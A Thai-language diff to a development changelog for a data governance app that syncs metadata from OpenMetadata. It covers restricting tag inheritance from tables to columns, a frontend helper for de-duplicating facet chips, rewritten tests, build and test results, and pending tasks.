+จะเขียนที่ระดับ column ไม่ได้ตลอดกาล (FR-2A.4) — และ `AssetContextLoader` อ่าน `asset_facet` ด้วย `target_fqn` ตรงๆ **ไม่มี fallback จาก column ขึ้นไปหา table** จึงต้องตกทอดไว้
+
+#### ⚠️ ของที่ **ไม่ได้** แตะ — tag ancestor ยังกางเหมือนเดิม
+
+อย่าสับสนสองอย่างนี้ ทั้งคู่สร้างแถวที่ `is_direct = false` เหมือนกัน:
+
+| | ตัวอย่าง | `inherited_from` | สถานะ |
+|---|---|---|---|
+| **tag ancestor** (`FacetExtractor.ancestorsOf`) | `PII.NonSensitive` ⇒ `PII` depth 1 | `NULL` | **คงไว้** — คือประโยคเดิมอ่านหยาบลง และ selector `classifications contains 'PII'` พึ่งมัน (FR-2A.2) |
+| **parent→child inheritance** (`FacetInheritance.effective`) | tag ของ table ⇒ ทุก column | `<fqn ของชั้นบน>` | **จำกัดแล้ว** |
+
+#### ลบ dead code ที่ตามมา
+
+เมื่อไม่มี facet ตระกูล tag เหลือใน `INHERITABLE` แล้ว กลไก mutual-exclusion (`blockedByOverride`, `exclusiveRootsHeldBy`, set `settled`) **วิ่งไม่ถึงอีกต่อไป** → ลบทิ้ง ไม่ทิ้งไว้ให้คนอ่านหลงว่ายังทำงาน
+พารามิเตอร์ `mutuallyExclusiveRoots` ยังรับไว้ (ผู้เรียกส่งมา) แต่ javadoc ระบุชัดว่าไม่ได้ใช้แล้วและทำไม
+
+> **หมายเหตุ:** อันนี้ **ต่างจากแผน FR-2A.1** ที่เขียนว่า "union ของที่ผูกตรง + ที่ตกทอดมาจากชั้นบน" ทำตามคำสั่งผู้ใช้ที่ว่าอย่าไปแต่ง metadata ที่ต้นทางไม่มี — ถ้าจะกลับ แก้ที่ `INHERITABLE` บรรทัดเดียว
+
+### AM.4 ฝั่งหน้าจอ — column row ไม่ต้องพูดซ้ำสิ่งที่ table พูดไปแล้ว
+
+หลังแก้ backend column ยังเหลือชิปอยู่ 8 ตัว เพราะหน้า Columns วาด facet **ทุกแถว** ที่ถึง column รวม domain 3 ชั้นกับ owner 2 คนของ table ซ้ำทุกบรรทัด — ตาราง 352 column ก็คือพูดเรื่องเดิม 352 รอบ
+
+เพิ่ม `columnFacets()` ใน `facets.tsx`
+
+```ts
+export function columnFacets(facets: FacetRow[]): FacetRow[] {
+  return listFacets(facets.filter((facet) => !facet.inheritedFrom));
+}
+```
+
+- `!facet.inheritedFrom` → ตัดของที่รับมาจาก table (table วาดไว้แล้วข้างบน)
+- `listFacets()` → ม้วน ancestor ที่ materialize ไว้ (`PII.NonSensitive` ไม่ต้องมี `PII` เปล่าๆ ต่อท้าย) และตัด `classifications` / `tier` ที่ซ้ำกับ tag
+
+subtitle เปลี่ยนจาก `N carrying a facet` เป็น `N carrying governance of their own` เพราะตัวเลขเปลี่ยนความหมายไปแล้ว
+
+### AM.5 ผลจริงหลังแก้ — ตรงกับ OpenMetadata ทีละตัว
+
+re-crawl แล้วอ่านทั้ง DB และ API:
+
+```
+created_at -> ['PII.NonSensitive', 'PII']
+id         -> ['PII.NonSensitive', 'PII']
+name       -> ['MFEC-PDPA.Sentitive (ข้อมูลส่วนบุคคลอ่อนไหว)', 'MFEC-PDPA']
+```
+
+- **39 แถว → 24 แถว** ที่ระดับ column
+- `PII.Sensitive` กับ `Tier.Tier2` ของ table **ไม่ไหลลง column อีกแล้ว**
+- ที่เหลือคู่กับ tag ของตัวเองคือ ancestor ของ tag ตัวนั้นเอง (`PII`, `MFEC-PDPA`) ซึ่งคงไว้ให้ selector — และหน้าจอม้วนทิ้ง เหลือ **ชิปเดียวต่อ column ตรงกับ OpenMetadata**
+
+### AM.6 เทสต์ที่เขียนใหม่
+
+`FacetInheritanceTest` เขียนใหม่ทั้งไฟล์ แบ่ง `@Nested` 2 ก้อนตามสัญญา 2 ข้อ:
+
+| `Inherited` — *ที่ OM ตกทอด เราตกทอด* | `NotInherited` — *ที่ OM ไม่ตกทอด เราไม่แต่งขึ้น* |
+|---|---|
+| `inheritsDownwards` | `tagsDoNotDescend` |
+| `namesTheSource` | `ownColumnTagSurvivesAlone` |
+| `nearestAncestorWins` | `theRestOfTheTagFamilyStaysPut` (TIER + CLASSIFICATIONS + TERMS) |
+| `ownRowWins` | `tagsDoNotDescendBetweenAssets` |
+| `customPropertiesReachColumns` | |
+
+`AssetCrawlerTest` — 3 เทสต์ที่ assert พฤติกรรมเดิมถูกเขียนใหม่ให้ใช้ **domain** (facet ที่ตกทอดจริง) แทน tag และเพิ่มตัวใหม่
+
+- `untaggedColumnsAreStillCovered` → **`untaggedColumnsStayUntagged`** (`.isEmpty()`)
+- `columnOverridesInheritedTier` → **`columnKeepsOnlyItsOwnTag`**
+- ใหม่ **`domainDescendsWhereTagsDoNot`** — level เดียว ใส่ทั้ง tag และ domain แล้ว assert ผลลัพธ์ต่างกัน 2 แบบใน crawl เดียว
+
+ฝั่งหน้าจอเพิ่ม **`a column does not repeat what it inherited from its table`** — ให้ column `id` ถือแค่ domain ที่รับมาจาก table แล้ว assert ว่าแถวนั้นวาด `—` ไม่ใช่ชิป `Finance`
+
+### AM.7 ผลรันจริงรอบนี้
+
+```bash
+export JAVA_HOME=".tools/jdk-21.0.12.1+1"
+
+./mvnw -o -pl backend/dac-connector-openmetadata -am test
+# → 91 tests, Failures: 0   (AssetCrawlerTest 6 · FacetInheritanceTest 9)
+
+./mvnw -o test
+# → BUILD SUCCESS ทุก module
+
+./mvnw -o verify -Pintegration
+# → 132 integration tests, Failures: 0
+#   ตัวที่อ่าน asset_facet ผ่านหมด: AssetStoreIT 7 · CatalogQueryIT 18 ·
+#   PolicyBindingMaterializerIT 10 · ImpactAnalysisIT 8 · PolicyOverviewIT 24 ·
+#   GrantCompositionIT 17
+
+cd frontend/app && npx tsc --noEmit    # → exit 0
+cd frontend/app && npx jest            # → 21 suites / 129 tests ผ่านหมด
+cd frontend/app && MSYS_NO_PATHCONV=1 VITE_BASE=/Arak/ npx vite build   # → ✓ built
+```
+
+restart backend แล้ว **Flyway migrate V13 + V14 สำเร็จ** (`now at version v14`) และ re-crawl ผ่าน `POST /api/v1/sync/openmetadata` — 33 tables / 352 columns / 1817 facet rows
+
+### AM.8 ไฟล์ที่แตะรอบนี้
+
+| ไฟล์ | ทำอะไร |
+|---|---|
+| `backend/dac-connector-openmetadata/.../facet/FacetInheritance.java` | เพิ่ม `INHERITABLE` + guard, ลบ dead mutual-exclusion, เขียน javadoc ใหม่ |
+| `backend/dac-connector-openmetadata/.../facet/FacetInheritanceTest.java` | เขียนใหม่ทั้งไฟล์ — 2 `@Nested` / 9 เทสต์ |
+| `backend/dac-connector-openmetadata/.../crawl/AssetCrawlerTest.java` | 3 เทสต์เปลี่ยนไปใช้ domain, +1 เทสต์ใหม่ |
+| `frontend/app/src/pages/catalog/facets.tsx` | เพิ่ม `columnFacets()` |
+| `frontend/app/src/pages/catalog/AssetDetailPage.tsx` | column row ใช้ `columnFacets()`, แก้ subtitle |
+| `frontend/app/src/pages/catalog/AssetDetailPage.test.tsx` | แก้ 2 assertion + เพิ่มเทสต์ใหม่ |
+
+### AM.9 ต่อจากนี้ (ค้างอยู่ ยังไม่ได้เริ่ม)
+
+1. **หน้าแรกของ Requestor** — ไม่ต้องเห็น policy/governance widget ให้เป็นหน้า global search แบบหน้าแรก OpenMetadata แต่เข้า theme เรา และยัง customize ได้
+2. **หน้า Your Profile — การ์ด Attributes** ยังไม่สวย ต้องจัดใหม่
+3. **OpenMetadata connection ให้แก้ instance / credential ได้จากหน้าจอ** — ออกแบบไว้แล้ว (`V15__openmetadata_connection.sql`, `OmConnectionStore`, `OpenMetadataClient.reconfigure`, `WebhookResource` รับ `Supplier<String>`) แต่ยังไม่ได้เขียน
+4. **Home dashboard ฝั่ง frontend** — backend + 26 เทสต์เสร็จแล้ว frontend มีแค่ `api/home.ts`
+5. **ยังไม่ได้ commit** — local ยังนำ `origin/main` อยู่ 5 commit
+
+---
+
+## รอบก่อนหน้า — 🐛 **บั๊กจริงที่ลบข้อมูลทดสอบทิ้งทั้งชุด (`demo-pg` หาย + query ถูกปฏิเสธ)** · **Query Explorer เห็นเฉพาะ source ที่ต่อไว้จริง** · และ **Roadmap เพิ่ม M9 Access Request Management**
 
 ### AL.1 🐛 บั๊กที่ทำให้ `demo-pg` หายและทุก query ขึ้น "is not a governed asset"
 
